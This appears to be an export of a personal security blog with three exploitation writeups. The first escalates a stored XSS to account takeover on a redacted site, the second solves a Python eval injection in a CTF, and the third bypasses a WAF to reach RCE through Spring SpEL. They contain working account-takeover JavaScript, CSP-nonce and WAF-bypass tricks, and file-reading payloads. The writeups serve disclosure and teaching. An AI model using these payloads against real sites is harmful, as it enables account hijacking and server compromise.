[{"body":"","link":"https://www.pmnh.site/","section":"","tags":null,"title":""},{"body":"Stored XSS to Account Takeover (ATO) via GraphQL API Late last year on HackerOne during an LHE (this is only important later due to an extreme time crunch), I found an extremely challenging vulnerability on a major brand's web site involving several layers of exploitation ultimately resulting in a stored XSS payload that was able to take over a victim's account simply by visiting a specific, innocuous page on the brand's main website (www.redacted.com). The scope of this vulnerability was entirely within the brand's public program.\nThis vulnerability paid out as a high (CVSS 8.7) and I thought the process of discovering and then exploiting it would be interesting to describe. One thing that I will not shy away from here is that I was stuck - completely stuck - several times during the course of exploiting this vulnerability. I almost gave up and thought it was impossible, particularly because I have a very bad track record for exploiting tough XSS and especially dealing with weird encoding solutions.\nHowever, I thought it could also be inspiring and maybe someone reading this will reconsider a bug they thought that they took to the limit - and push through to a higher impact outcome!\nThe Setup The initial vulnerability that I found had to do with this brand's payment processing API - this is an API that is used by customers (merchants) to process credit cards and financial transactions in various countries. This brand is multi-national, so they deal with many different types of transactions in many different countries - including some that I, based in the US, had never heard of and had to research as part of my recon.\nOne type of transaction that this payment processor supported was an offline payment flow to handle geographies where credit cards are uncommon and cash transactions are more prevalent. In these locations, the payment processor allows a customer to make an e-commerce purchase and acquire a unique code (like a QR code) which they can bring into a store and pay cash for the transaction. Once the store confirms the transaction, the e-commerce merchant is paid for the goods and the customer will receive them.\nThus, the flow of the transaction goes something like this:\ne-commerce merchant initiates an offline payment flow when the customer places their order e-commerce merchant gives the customer a unique in-store code which can be used for payment (offline) customer brings the code to a store in the payment network and pays in cash e-commerce merchant is notified that the payment occurred e-commerce merchant sends the customer a unique URL which they can visit to confirm their purchase Note that the \u0026quot;unique URL\u0026quot; in the final step is supplied by the merchant when the transaction is set up (you can think of this as the \u0026quot;confirmation URL\u0026quot; in a traditional online credit card-based workflow).\nThe Payload In this case our attacker is a merchant (or a user of that merchant) with the ability to create these offline transactions. The merchant will submit a confirmation URL containing an XSS payload. This payload, once persisted, is visible under a page on the brand's main website (www.redacted.com).\nOur merchant submits the request via a GraphQL API on a different domain payments.redactedtwo.com which has a payload as follows (apologies for so much redaction):\n1POST /graphql HTTP/1.1 2Host: payments.redactedtwo.com 3... 4 5{\u0026#34;query\u0026#34;:\u0026#34;mutation {\\n ...redacted...(input:{ ...redacted... \\n 6 returnUrl: \\\u0026#34;\u0026lt;payload here\u0026gt;\\\u0026#34; ... }) ... We can see this GraphQL API accepts a returnUrl parameter that will be our payload source. Note that the GraphQL call is an API on a completely separate top-level domain. This was interesting because it allowed a stored payload in one of the brand's domains to be rendered in another, arguably more critical, domain. Once submitted, we can visit a unique, static URL on the www.redacted.com site containing our payload in the returnUrl parameter.\nLet's see how the payload appears on the sink at www.redacted.com:\n1\u0026lt;script nonce=\u0026#34;G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE\u0026#34;\u0026gt; 2window.location.href = \u0026#39;\u0026lt;payload\u0026gt;?..dynamic url parameters...\u0026#39; 3\u0026lt;/script\u0026gt; We see this script has a nonce, and our injection point \u0026lt;payload\u0026gt; is within the script - seems like a very easy stored XSS, right?\nThe presence of the nonce will become important later, let's look at the Content-Security-Policy header to see what restrictions that are in place (note: I didn't look at CSP until I was well into payload development - big mistake that caused me to backtrack at least 2 hours for reasons I will describe later). I'll break it into lines for easier reading:\n1Content-Security-Policy: 2default-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://*.redacted.com https://*.redactedtwo.com; 3script-src \u0026#39;nonce-G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE\u0026#39; \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://*.redacted.com https://*.redactedtwo.com; 4img-src \u0026#39;self\u0026#39; https:; 5frame-src \u0026#39;self\u0026#39; https://*.redacted.com https://*.redactedtwo.com https://*.qualtrics.com; 6child-src \u0026#39;self\u0026#39; https://*.redacted.com https://*.redactedtwo.com; 7object-src \u0026#39;none\u0026#39;; 8font-src \u0026#39;self\u0026#39; https://*.redacted.com https://*.redactedtwo.com; 9base-uri \u0026#39;self\u0026#39; https://*.redacted.com; 10form-action \u0026#39;self\u0026#39; https://*.redacted.com; 11upgrade-insecure-requests; 12connect-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://*.redacted.com https://*.redactedtwo.com https://*.qualtrics.com; We can see that this CSP is quite restrictive - we can only source information from the (hardened) brand site itself, and the nonce is required for any script tags on the page.\nAttempt 1: javascript:// url The obvious first attempt with an injection point at the location.href= is to simply put a Javascript scheme with a payload, e.g. javascript://alert(1). I was lucky because here there was no obvious WAF blocking simple payloads like this. So I tried this and...\n... it failed. The GraphQL API rejected the URL with a 400 error. I tried many other attempts, encoding, base, whitespace, etc. - no luck. The API was validating that the URL provided started with https:// and contained a full hostname followed by a trailing /. So clearly we have an open redirect but I knew this could be exploited for a stored XSS.\nFor example https://hackerone.com/ would result in the following stored payload:\n1\u0026lt;script nonce=\u0026#34;G4bzKjjcoKYHhRqFR4jI3hADUnme1CL14sqI8gUqRhcRi+DE\u0026#34;\u0026gt; 2window.location.href = \u0026#39;https://hackerone.com/?...dynamic URL parameters...\u0026#39; 3\u0026lt;/script\u0026gt; A quick note on the ...dynamic URL parameters... - these are parameters which are appended to the URL provided in the GraphQL API representing the unique transaction ID, information about the customer, etc. - this always is appended with a leading ? within the single quotes.\nSide Note: Several false starts here Later on in this story, for reasons which will become obvious, I tried submitting various forms of https:// urls without the trailing slash - this would lead to everything after the hostname being URL encoded and generally being useless for XSS in a Javascript context. I should have tried this earlier on as it would have saved a ton of time later.\nAttempt 2: Trailing payload We know at this point the payload has to start with a valid URL and hostname, so we start with https://hackerone.com/ as the start of our payload.\nFortunately for us, the next most obvious payload I could think of worked. Single quote characters were not blocked or encoded in any way, so the following payload actually generated a stored alert:\n1https://hackerone.com/\u0026#39;;alert(document.domain);// This generated an alert (great) but when closed the user was immediately redirected to the URL provided. Excellent! Stored XSS payload with DOM access!\nSubmission At this point I thought I was good and submitted the bug in the LHE prior to the on-site portion of the event. After it was triaged at a Medium impact, I sent a note to the triage / customer team asking what was required to prove higher impact.\nAs an aside, for those who don't know how HackerOne LHEs are structured, there is a portion (5.5 days) during which the LHE participants are informed on the scope and can submit bugs. These bugs are triaged but not finalized / paid until the live portion of the event. The live portion comprises a single day (actually ~10 hours) where participants can submit additional bugs or escalated previously submitted bugs.\nThe customer (via the triage team) responded that they felt with the CSP and cookie settings in place on the main site, it was not possible to escalate the stored XSS to any higher severity.\nChallenge Accepted! Of course I considered this a challenge because I knew with the payload sitting in a \u0026lt;script nonce\u0026gt; context I should be able to craft any payload I want, exploiting this will be easy!\nNext Step: Building the ATO payload I began to craft the best stored XSS ATO payload I could imagine. The payload performed the following tasks, which I tested in the dev console (F12) of a window I had open on the main site:\nGrab the CSRF token for the user by making a XMLHttpRequest to the site's main page Extract the CSRF token by parsing the HTML returned from the fetch call Make an API call to change the email address on the account using XMLHttpRequest Note that the connect-src in the CSP made it impossible to try to exfiltrate information from the page to an attacker domain using Javascript, therefore ATO (or similar behavior of CSRF was my option for an impactful payload here).\nAt this point the account can be taken by the attacker as they control the email address and can use the \u0026quot;forgot password\u0026quot; functionality to complete the takeover. The cookies (even HttpOnly) will be sent on the last request becasse the same-origin policy will allow them to be included (the XHR is originating from the correct domain, www.redacted.com).\nAs I imagine most of you are familiar with writing a payload of this type I won't get into details here, as it was pretty simple:\n1function decodeHtml(html) { 2 var txt = document.createElement(\u0026#34;textarea\u0026#34;); 3 txt.innerHTML = html; 4 return txt.value; 5} 6fetch(\u0026#34;https://www.redacted.com/url/to/get/csrf/\u0026#34;).then(r =\u0026gt; r.text()).then(r =\u0026gt; { 7 csrf_token = /data-token=\u0026#34;([^\u0026#34;]*)\u0026#34;/.exec(r)[1] 8 var xhr = new XMLHttpRequest(); 9 xhr.open(\u0026#34;POST\u0026#34;, \u0026#34;https://www.redacted.com/api/to/change/email\u0026#34;, true); 10 xhr.setRequestHeader(\u0026#34;X-Csrf-Token\u0026#34;, decodeHtml(csrf_token)); 11 xhr.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;); 12 xhr.withCredentials = true; 13 o=new Object(); ... other parameters ... o.email=\u0026#39;\u0026lt;my_email_address\u0026gt;\u0026#39;; 14 xhr.send(JSON.stringify(o)); 15}) I tested this in the Chrome dev console and confirmed it had the desired effect of ATO. Ready to go!\nAttempt 3: Rejection I submitted the payload to the GraphQL API and it was looking good! No errors initially, but then I hit the stored XSS page itself and saw...\n1HTTP/2 400 Bad Request The stored payload did not render!\nWent back to the original alert(document.domain) payload, and it worked. So, there must be something in my complete ATO payload that was causing the server not to render the XSS.\nAfter much iteration with the working payload (unfortunately since source and sink were different transactions and required several in-between steps, I couldn't use any convenient automated tools), I discovered that all the following characters would lead to the 400 error:\n1{}\u0026lt;\u0026gt;\u0026#34;[] Note all whitespace characters were also rejected. There may be other characters that I don't remember üòÅ but the following definitely were not blocked:\n1()=.;/\\ So, I had a limited Javascript vocabulary to deal with, no problem!\nAttempt 4: Async I ended up rewriting most of my payload to exclude the restricted characters. Note that I tried all types of encoding (URL, javascript, hex, octal, double-encoding, etc.) and none of these could be used to bypass the restrictions. I'll note this was extremely tedious because the error showed up at the sink, not the source, so each iteration wasted at least a minute or two.\nI even got the initial fetch request to work with the restricted character set, with something like:\n1https://hackerone.com/\u0026#39;;fetch(\u0026#34;https://www.redacted.com/url/to/get/csrf/\u0026#34;).then(console.log);// I could see the Response object from the fetch call hit the console log - now we are getting somewhere!\nThen I ran into the big problem.\nRemember that my attack chain requires 3 steps:\nMake XHR call to get page with CSRF token on it Extract CSRF token from the returned HTML Make XHR call with CSRF token to ATO Because fetch (and XMLHttpRequest) are async APIs we need to fill in the then method argument with a lambda function, which will be asynchronously executed when the Promise resolves (more on this at mdn). Here's the problem, without the {}\u0026gt; characters I do not believe there is a way to construct a lambda function in Javascript, either with brace syntax or arrow syntax (if someone smart reading this comes up with a suggestion, my DMs are open on Twitter and I'm very interested!).\nI recognized this immediately as a huge roadblock. Even if I rewrite the rest of my payload to avoid all these other characters (which ended up being possible) the inability to define lambda functions to be called when the Promise resolved was a showstopper.\nBut wait! In the documentation of the Function object in the Javascript reference, there is a form Function(var, body) where body is a string! No braces or arrow syntax required!\nAttempt 5: One more thing... I excitedly rewrote my payload to take advantage of this amazing syntax only to find something I missed in the CSP... eval is not allowed due to the CSP missing the unsafe-eval directive. That's right, this form of the Function constructor (not surprisingly) uses eval under the covers to convert that string to an actual Javascript function.\nThis was unfortunate because I wasted about 30 precious minutes figuring out how this syntax worked (the documentation is a bit vague on how variables are passed in and referenced).\nI decided that this approach was simply impossible due to the specific characters that were being blocked. (Actually at this time I hadn't figured out that whitespace was also blocked for some reason, I will blame lack of sleep), which would have made writing a function difficult to impossible anyway.\nAttempt 6: A different approach So at this point I got some food as I had been struggling for at least 3 hours without a break. As I wandered the hall I pondered. Clearly I could call Javascript methods because I had access to the ().; characters. Surely I could come up with something!\n(I'll add that I'm sure someone would have been more than happy to help me but as this was my first LHE I wanted to get a really impactful bug without assistance of any kind!)\nI realized three things at this point:\nIn order to successfully deliver my working payload I needed to work around the blocked special characters, I had confirmed that I could execute arbitrary Javascript code provided I was careful about what characters I used, I had access to the correct value of the nonce in the DOM on the \u0026lt;script\u0026gt; tag that was already there I decided that I'd try the following approach:\nUse very simple Javascript to create a new \u0026lt;script\u0026gt; DOM node Set the nonce on that script node to match the nonce of the \u0026lt;script\u0026gt; node already on the page Figure out a way to encode my payload so that I could set the innerText of the new \u0026lt;script\u0026gt; node to a value that did not have special characters Insert my new \u0026lt;script\u0026gt; tag into the DOM and the payload will execute As a fun bit of trivia, if you haven't already encountered this - if a \u0026lt;script\u0026gt; tag has already started executing (the one tag on the page), replacing the innerText will do nothing. Due to the CSP I didn't see any way other than a \u0026lt;script\u0026gt; tag with nonce to execute my payload (again, I'm interested in comments or suggestions if I did!).\nHowever, if the page hasn't completed rendering and execution of inline script, you can insert a new \u0026lt;script\u0026gt; node after the inline script and it will execute (note this only works if the page hasn't loaded yet - if you try to insert a \u0026lt;script\u0026gt; DOM node after the onload event has fired, it's too late).\nHope you are all still with me!\nI decided to try this with a simple payload that looked something like this:\n1https://hackerone.com/\u0026#39;;s=document.createElement(\u0026#39;script\u0026#39;);s.nonce=document.getElementsByTagName(\u0026#39;script\u0026#39;).item(1).nonce;s.innerText=\u0026#39;alert(document.domain);\u0026#39;;document.head.appendChild(s);;//\u0026#39; I fired it and... it worked! The alert popped and the presence of the nonce on the new tag allowed my script to pass the CSP checks.\nSuper excited because it seemed like this strategy was going to work!\nAttempt 7: Special Character avoidance I will say that I basically had the idea for the rest of the payload at this point, but I was under extreme time pressure to submit my escalation before the end of the LHE and ended up wasting some time with a couple stupid mistakes.\nThe first mistake was trying to just encode only those characters that were being blocked. This was hard to do manually and took a lot of time when I discovered I missed a character.\nSo I decided on the following approach:\nCreate a file redacted_payload.txt with my Javascript payload Run the following shell command to encode every character in the file into a series of calls to String.fromCharCode The resulting shell command:\n1(for i in `cat redacted_payload.txt | xxd -ps -c 0 | sed -e \u0026#39;s/\\(..\\)/\\1\\n/g\u0026#39;`; do echo \u0026#34;String.fromCharCode(\u0026#34;$((16#${i}))\u0026#34;)+\u0026#34;; done) | tr -d \u0026#39;\\n\u0026#39; And the output:\n1String.fromCharCode(123)+String.fromCharCode(32)+String.fromCharCode(102)+String.fromCharCode(117)+ 2... repeating for many characters ... Again, when not under time pressure I'm sure I could some up with something more elegant here, but this worked and I ended up with a very large payload (fortunately there was no length limit on the URL that could be stored!).\nI submitted the full payload which now looked like:\n1https://hackerone.com/\u0026#39;;s=document.createElement(\u0026#39;script\u0026#39;);s.nonce=document.getElementsByTagName(\u0026#39;script\u0026#39;).item(1).nonce;s.innerText=\u0026lt;very_long_encoded_payload\u0026gt;;document.head.appendChild(s);;//\u0026#39; And...it didn't work. That's when I remembered something I overlooked...\nFinal Step: That pesky redirect Remember that the inline script where we are injecting started by redirecting the window by setting the location.href attribute. This causes the browser to start navigating, at which point it may / may not complete execution of any further inline script and it certainly will not wait for async Promises to complete such as an XHR or fetch. What I was seeing was that my encoded payload was working but the browser would immediately navigate away from the page and the whole thing didn't get the chance to complete.\nAlso remember that the redirect has to start with a legitimate hostname, so there was no chance of providing an invalid redirect which the browser would not navigate to.\nAt this stage I started to panic a little bit, I had about 30 minutes before submissions closed and I knew that I was within reach of an escalation. I trolled the Javascript reference about the behavior of location.href when set, and I saw the little gem window.stop() which is documented as \u0026quot;aborts browser naviagtion\u0026quot;. This looked like my answer, so I added a call immediately after the end of the URL string as so:\n1https://hackerone.com/\u0026#39;;window.stop();s=document.createElement(\u0026#39;script\u0026#39;);s.nonce=document.getElementsByTagName(\u0026#39;script\u0026#39;).item(1).nonce;s.innerText=\u0026lt;very_long_encoded_payload\u0026gt;;document.head.appendChild(s);;//\u0026#39; Good news: this had the intended effect of stopping the redirect!\nReally really bad news: this also stopped any outstanding fetch or XHR request with no easy way to recover.\nAlthough it probably would have been possible to write some clever code to deal with this problem, I now only had 20 minutes left and needed a solution fast!\nAt this point I wondered if I set location.href again to something else, if that 2nd assignment would override the first navigation if it was fast enough. At first I tried with a javascript: URL (this would have been too easy), and finally discovered that the URL foo://a would make the browser behave exactly as I hoped:\nStop the navigation to the legit URL Generate an error (not important) Allow further XHR/fetch requests to proceed At this point, with only 15 minutes until submissions closed, I had my final payload:\n1https://hackerone.com/\u0026#39;;location.href=\u0026#39;foo://a\u0026#39;;s=document.createElement(\u0026#39;script\u0026#39;);s.nonce=document.getElementsByTagName(\u0026#39;script\u0026#39;).item(1).nonce;s.innerText=\u0026lt;very_long_encoded_payload\u0026gt;;document.head.appendChild(s);;//\u0026#39; I submitted the payload along with evidence of the successful stored XSS to ATO with literally minutes to spare, and having spent almost 6 straight hours on this escalation chain.\nThe customer accepted this escalation and was very surprised that this was possible with all the protections in place.\nConclusion A few final wrap-up tips:\nBeing familiar with Javascript language and syntax can be really helpful when out-of-the-box payloads don't work. The MDN reference material is hugely helpful in this regard. Being familiar with the language will also help you better work around major blockers such as special characters. Under time pressure, it is very important to know when you are on a dead-end and backtrack to try a new approach - I did this several times during this exercise. Knowing how to write simple text processing scripts will save a ton of time if weird encoding is required. I am sure that there are other ways this problem could have been solved, but I thought the journey to a solution and the thought process (and failures!) at the different stages might be interesting to readers\n","link":"https://www.pmnh.site/post/witeup_lhe_graphql_stored_xss/","section":"post","tags":["writeup","xss","graphql","hackerone"],"title":"Bug Writeup: Stored XSS to Account Takeover (ATO) via GraphQL API"},{"body":"","link":"https://www.pmnh.site/tags/graphql/","section":"tags","tags":null,"title":"graphql"},{"body":"","link":"https://www.pmnh.site/tags/hackerone/","section":"tags","tags":null,"title":"hackerone"},{"body":"","link":"https://www.pmnh.site/post/","section":"post","tags":["index"],"title":"Posts"},{"body":"","link":"https://www.pmnh.site/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"","link":"https://www.pmnh.site/tags/writeup/","section":"tags","tags":null,"title":"writeup"},{"body":"","link":"https://www.pmnh.site/tags/xss/","section":"tags","tags":null,"title":"xss"},{"body":"","link":"https://www.pmnh.site/tags/ctf/","section":"tags","tags":null,"title":"ctf"},{"body":"Summary One of the things that I love about CTFs is when they provide challenges that don't require knowledge of weird language quirks or obscure exploits or (ugh) guesswork but instead just a clear head and some common sense. Kudos to the designer of the DeadSec 2023 CTF Trailblazer challenge, which offered exactly this type of problem.\nRecon The Trailblazer challenge provided exactly one page to the site and no source code was provided. Visiting the home page of the site provided the following text content:\n1[0-9 a-z A-Z / \u0026#34; \\+ , ( ) . # \\[ \\] =] Visiting any other page of the site would result in the following 404 page:\nInteresting to note that the image appearing on the page is generated from the endpoint /images/now and appears to contain a timestamp.\nOne other observation is that the server is running the (Python) waitress framework, which we can see from the server headers:\n1Server: waitress Now that we have a sense for the server and related software, let's solve this challenge!\nAnalysis The endpoint now, combined with the contents of the generated image, should be familiar to anyone who is at all familiar with the Python language, as being the default format of a datetime object, and the Python library function datetime.now can be used to return the current timestamp:\n1Python 3.8.10 (default, Mar 13 2023, 10:26:41) 2[GCC 9.4.0] on linux 3Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. 4\u0026gt;\u0026gt;\u0026gt; import datetime 5\u0026gt;\u0026gt;\u0026gt; str(datetime.datetime.now()) 6\u0026#39;2023-05-21 12:26:57.831648\u0026#39; We note that this matches what we see in the generated image. This allows us to conclude that the solution path here is a sort of RCE which will lead to us changing the contents of the image. We can easily verify this by picking some other class-level functions in the datetime class such as utcnow or today, which will generate the same image.\nLeading to a Solution So at this point we know:\nThe image is being generated by Python code probably eval'ed from a string like this: datetime.**last-path-segment**() Certain characters are not allowed in the path segment (we assume this from the list of characters shown on the home page) Our goal is to read the content of flag.txt (this was later provided as a hint although I solved the challenge prior to this hint being available) Let's see if we can chain a simple method call first, since the injection point ends with parens we know that the last part of our injection has to be a function that takes no parameters. So the following works:\n1/images/now().toordinal This results in an image with the following content 738861. So we've confirmed we can chain function calls as we had hoped, and the contents of the image will reflect the return value of the last function call (toordinal is a function on a datetime object as documented here).\nIf you don't want further spoilers, you can safely stop here and try to build the exploit chain yourself üòÅ\nReading a File Finally, I had to come up with a way to read the content of the flag file and ensure the contents of the file fed into the method chain, since we can't inject carriage returns and other control structures due to the character set limitations. Also, we can't use a typical __globals__ type injection because the _ character is prohibited.\nThe path I took was to inject a Python lambda function, which allows for arbitrary / simple inline code to be used to process typically an iterator such as an array or string. Typically these are used to perform some sort of processing on the input i.e. a transformation, but in this case we're just using it as a vehicle to inject arbitrary code.\nLambda functions can be used in many Python library functions, but map seemed like a logcal choice. Since map requires an iterable parameter, and we are starting from a datetime object, I decided to figure out how to get a string from the datetime and then pass the string to the map function. I built up the payload like so:\n1/images/now().strftime(%22aaa%22).title --\u0026gt; AAA Remember we still have to end the injection with a parameterless function invocation, there are many on string. strftime on the datetime class was useful because it allows us to provide any arbitrary string as output. We pass this lambda result to strftime to get the string value added into the method chain. We iterate on a dummy array [1] so that the lambda function is executed exactly once:\n1/images/now().strftime(str(map(lambda a: a, [1]))).title --\u0026gt; \u0026#39;\u0026lt;Map Object At 0X7Fd1789Fd9A0\u0026gt;\u0026#39; Oops! From this we can see our basic premise works, but we need to convert the map object (with a single element) to a printable string so we can see the result in the image output, we do this by wrapping it with the str(list(...)) built-in functions:\n1/images/now().strftime(str(list(map(lambda a: a, [1])))).title --\u0026gt; \u0026#39;[1]` Now we simply put an open('flag.txt').read(100) in the lambda and we should have our flag:\n1/images/now().strftime(str(list(map(lambda a: open(\u0026#34;flag.txt\u0026#34;).read(100), [1])))).title And we see the flag is (partially) revealed!\nFurther work was required to see the whole flag, this was made a little more painful because the font used in the image did not clearly indicate uppercase and lowercase letters. We'll leave this as an exercise to the reader, try reproducing this in your local Python CLI and see how you might iterate through the characters üòÑ\nOverall a super fun challenge that required no brute force or guesswork but just putting the pieces together. Thanks DeadSec!\n","link":"https://www.pmnh.site/post/ctf-deadsec-2023-trailblazer/","section":"post","tags":["ctf","python","rce"],"title":"CTF Writeup: 2023 DeadSec CTF: Trailblazer"},{"body":"","link":"https://www.pmnh.site/tags/python/","section":"tags","tags":null,"title":"python"},{"body":"","link":"https://www.pmnh.site/tags/rce/","section":"tags","tags":null,"title":"rce"},{"body":"Summary This writeup talks about a successful collab that I did with Dark9T (@UsmanMansha) on a private program hosted on Bugcrowd. We ended up able to bypass Akamai WAF and achieve Remote Code Execution (P1) using Spring Expression Language injection on an application running Spring Boot. This was the 2nd RCE via SSTI we found on this program, after the 1st one, the program implemented a WAF which we were able to bypass in a different part of the application. Read on to find out how we did it!\nIntro Usman reached out to me on a Slack server where we are both members. They had found a potential SSTI but were not able to exploit it due to an Akamai WAF:\nAfter a quick look, this seemed to be a case of the famous Spring Boot Error page issue described on Github here - note that there was never a CVE issued for this as far as I am aware. This vulnerability has been covered in various forms for example by 0xdeadpoool on their blog here.\nThe basic principle of this bug is that the vulnerable version of Spring Boot will render the error message from the thrown Exception into the page itself using an SpEL (Spring Expression Language) expression. The vulnerable version of the Spring Boot framework will allow recursive evaluation of this expression, thus an error message which contains a valid SpEL expression (e.g. $(7*7)) would be evaluated at the the time the error page is rendered.\nIn this case we could see the q parameter of the vulnerable URL supported injection of the type ${x*y} and returned a mathematical result in the error text:\nSteps with RCE via SpEL If you haven't had experience with this type of vulnerable application before, I'd strongly suggest some practice using an application such as https://github.com/jzheaux/spel-injection where you can experiment with how SpEL is constructed and handled (and potentially secured) within Spring applications. While this application doesn't deal directly with this specific vulnerability, SpEL is used so often in the Spring Ecosystem it's worth some practice and familiarity with the code.\nThis blog won't introduce you to Spring Expression Language as the topic is quite complex, essentially it's a language which allows context-based navigation of Spring objects, similar to other server-side templating languages. It's used many places in various Spring Framework components and the exact extent of objects and data available depends a lot on where it's used. Typically you can execute Java methods, construct objects, etc. - not as powerfully as FreeMarker or Velocity, but similar in risk profile. You can read about SpEL and its syntax in the Spring reference documentation.\nGenerally the goal with SpEL is to end up with an invocation of the methods java.lang.Runtime.exec or java.lang.ProcessBuilder.start which will allow execution of an OS command of the attacker's choosing, using an expression something like the following:\n1${T(java.lang.Runtime).getRuntime().exec(\u0026#34;\u0026lt;my command here\u0026gt;\u0026#34;)} If you want the output of the command, the expression gets a bit more complex, but let's start here.\nA Quick Note - Time / Effort Spent Folks who know me know that I am primarily a manual tester, relying on my extensive development/architecture experience rather than brute force to find tough bugs. Although reading a blog post may make it appear that a bug was obvious or a particular path was obvious, just to give some statistics, getting from the initial Slack message from Usman to full RCE took me:\nApproximately 500 hand-crafted attempts to bypass the WAF Approximately 14 hours of wall clock time from the initial attempt to the first successful RCE (execution of the uname -a command) - note that I took breaks to eat, take a walk, think about solutions etc. - it wasn't 14 hours straight! I'm including these because it's often the case that blog posts make this kind of bug \u0026quot;seem\u0026quot; a lot easier than it actually is, leading readers down the dark path of impostor syndrome etc., just reinforcing that even if you know what you're doing, sometimes bugs are really tough! Don't give up! üòÑ\nStep 1 - Try the Obvious First off we had to determine how to reach the java.lang.Runtime class, so that we could get an instance of it, on which to invoke the exec method. We tried the most obvious ${T(java.lang.Runtime)} - which is SpEL shorthand for referencing a Java class by name, and of course it was blocked by the Akamai WAF:\nSince Akamai WAF was in the way, I suspected this would not work, but when trying to work around a WAF it's really important to build up from small things that you know work, to larger and more complex payloads. This is true for RCE, SQLi, XSS, or any complex payload when trying to avoid WAF rules, very often WAFs are coded to recognize obvious payloads but (as we will see) can't figure out complex payloads.\nStep 2 - Figure out how to get an arbitrary Class Typically the next stage of a Java-based code injection vulnerability is to figure out how to get a reference to an arbitrary Class, from which we can use direct method invocation or reflection-based invocation to get at the method we want.\nThe easiest method is to do something like the following (which worked in this case):\n1${2.class} Response:\n1class java.lang.Integer This is a good sign, we know we can access the java.lang.Integer Class object (if you need a refresher [https://stackoverflow.com/questions/1215881/the-difference-between-classes-objects-and-instances](this SO answer is a good start)), and from here we should be able to get to the forName method to instantiate an arbitrary class. Let's try it!\n1${2.class.forName(\u0026#34;java.lang.String\u0026#34;)} Response:\n1\u0026lt;H1\u0026gt;Access Denied\u0026lt;/H1\u0026gt; 2 3You don\u0026#39;t have permission to access ... As expected, the obvious payload using the forName method with a string did not work and was easily detected by the Akamai WAF. In the next round of exploration I was able to determine that some sort of transformation was being applied to both single and double quotes that caused expressions using either of these characters to be malformed. Thus even if we could reach the Class.forName method, we wouldn't be able to take the straightforward route of something like ${2.class.forName(\u0026quot;java.lang.Runtime\u0026quot;)...} but instead need to find some other way to construct the name of the Class to be instantiated.\nStep 3 - Figure out how to get an arbitrary String I knew that being able to build an arbitrary string would be required to achieve the full RCE for multiple reasons:\nName of class to be instantiated or referenced Name of method (most likely .exec() is also blocked by the WAF) Command to be executed Keep in mind that I can't use quote characters of either type, so straightforward string concatenation is not possible in this circumstance. I needed to find a way to get from an integer value (ASCII or hex) to a character, and then concatenate characters to form a String.\nI've run into this situation a number of times, either solo or in collabs and I always refer back to the Java API Documentation which has so much useful information about available methods and classes, although I know many of the core Java classes by heart, it's often been the case that I find some hidden gem that will do exactly what I need!\nA few obvious choices in the Java standard library:\njava.lang.String constructor, taking a byte array (as inspired by mykong and Bealdung) java.lang.Character.toString method, described in Javadoc After some experimentation I determined that it was basically not possible to invoke any constructor, because both methods of invoking a constructor in SpEL, either new, T(), or through reflection and newInstance was also blocked by the WAF.\nSo it seemed like the java.lang.Character.toString method was the way to go, only one problem...\nStep 4 - Figure out how to get a reference to a java.lang.Character class Since java.lang.Character.toString is a static method on the java.lang.Character class, I simply needed a reference to an object of this type to be able to reach the method. Because SpEL is dynamic, I don't believe it supports casting as you could in static Java code, e.g. (char)99 - and unfortunately java.lang.Class was blocked by the WAF so I couldn't use the java.lang.Class.cast method.\nSo I ended up with the following chain:\nFigure out how to get a reference to a String object Call the java.lang.String.charAt method on that object (which returns a java.lang.Character) Invoke the toString static method on this character - since it's a static method it doesn't matter what the value of the Character is Thus I finally had my gadget required to build an arbitrary String:\n1${(2.toString()+2).charAt(0).class.toString(99)} Response\n1c Note that 99 is the ASCII value for the character c. Success!\nSince the + character was allowed through the WAF and in this context I was able to now build strings using this method of individual character concatenation.\nStep 5 - Build attack payload So, now we have one ingredient we need - building arbitrary String - we need one more, which is a way to invoke the java.lang.Runtime.exec method. I ended up using a technique similar to the one described here, basically the following:\nUse reflection to get access to the Class.forName method Build a String with the value java.lang.Runtime to pass to forName Use reflection to get access to the java.lang.Runtime.getRuntime method (required to get an instance of the class to invoke a method) Build a String with the value exec and/or use reflection to find the exec method of the java.lang.Runtime class Build a String with the RCE payload value to pass to the exec method In this phase of the exploitation, I spent a lot of time iterating over the output from various reflection calls. This is especially important because different JVMs will return different values, particularly when you are using the java.lang.Class.getMethods reflection technique.\nDon't invoke reflected methods blindly! There are dangerous methods on java.lang.Runtime such as shutdown which will immediately terminate the JVM!\nStep 6 - (Time Wasted) Trying to work around GET length restrictions At this point I realized that for some payloads I would end up with a really long payload if I'm constructing a long RCE command e.g. an nslookup or similar. My payload for a single character c was 45 bytes long (${(2.toString()+2).charAt(0).class.toString(99)})!\nWith a GET request maximum length enforced by some browsers and/or servers at approximately ~2kb this meant the longest String I could build might be only about 45 characters long - a big problem!\nAt this point I ended up going down a bit of a chase to figure out how to more efficiently create a String from a list of bytes. I tried a bunch of things and almost had one working using the neat collection projection feature of SpEL, but unfortunately I was blocked by a Spring bug in the version this target was running. Ultimately I couldn't find any more efficient method of building the String character by character.\nIn this sense I ended up getting lucky, the server accepted a GET request longer than 2kb (final payload was just under 3kb), and typically you are safe before 4kb on most servers.\nStep 7 - Assembling the final payload At this point after Step 5 I basically had all the pieces I needed to build the final payload, which was essentially a translation of the following payload:\n1org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(\u0026#34;uname -a\u0026#34;).getInputStream()) I'm not going to supply the payload in text form because I don't want someone blindly copy-pasting into a context where it likely won't work anyway, but hopefully this post gave you the methodology to build your own payload to bypass a WAF and server-side restrictions.\nFinal Thoughts I find WAF bypasses on critical vulnerabilities such as RCE and SQL Injection some of the most fun bugs to work on. Of course the rewards are good, but these sort of bugs really require deep knowledge of why a particular bug works, and the context in which it executes.\nIn this case, deep knowledge of Java and SpEL capabilities was required to construct a payload that would both bypass the Akamai WAF as well as work in the context where it was executing.\nI hope you enjoyed this writeup. If you encounter this type of injection and you need help bypassing a WAF, feel free to DM me on Twitter and I'm always happy to collab if you have a confirmed injection but can't escalate 